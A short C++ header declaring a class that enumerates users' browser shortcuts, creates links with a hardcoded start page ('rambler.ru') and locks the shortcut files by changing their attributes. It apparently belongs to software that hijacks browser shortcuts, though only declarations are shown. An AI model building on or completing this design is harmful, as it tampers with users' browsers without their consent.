#ifndef _LINKS_PLAYER_H
#define _LINKS_PLAYER_H


#pragma once
#include <vector>
#include <map>

#define DEF_START_PAGE   L"  \"rambler.ru\""
#define DEF_APP_PATH    L"\\Internet\\Application\\Internet.exe"


class CLinksPlaying
{
public:
	CLinksPlaying(void);
	~CLinksPlaying(void);
	
	BOOL LockLink(const wchar_t* Path);
	BOOL UnLockLink(const wchar_t* Path);


	std::vector<std::wstring> m_vecAllUsersLinks;
	std::vector<std::wstring> m_vecAllUsersURLlinks;
	std::vector<std::wstring> m_vecBrowserNameList;
	std::vector<std::wstring> m_vecTypeUrlNameList;
	std::vector<std::wstring> m_vecLinkLockedList;

	std::vector<std::wstring> m_vecNeededLinksPath;

	std::map<std::string, std::string> m_mapBrowsersLinkPathes; //LinkPath, maybe I'm not use this staff

	std::wstring m_sAppPath;

	void Init(void);
	BOOL EnumerateFolder(std::wstring PathToFolder);
	void run(void);
	HRESULT FillURLlinks(void);
	HRESULT FillAllLinksPathes(void);
	HRESULT FillingNeededLinks(void);
	HRESULT CreateLink(const wchar_t* lpszPathToObj, const wchar_t* lpszArguments, const wchar_t* lpszLinkFileName, const wchar_t* lpszDesc, const wchar_t* lpszIconLocation);
	std::wstring GetAppName();
	BOOL GetLokedInfo(const wchar_t * Path);
	BOOL ChangeAttributes(const wchar_t * Path, bool bUnlock=true);
	BOOL IsDots(const TCHAR* str);
};

#endif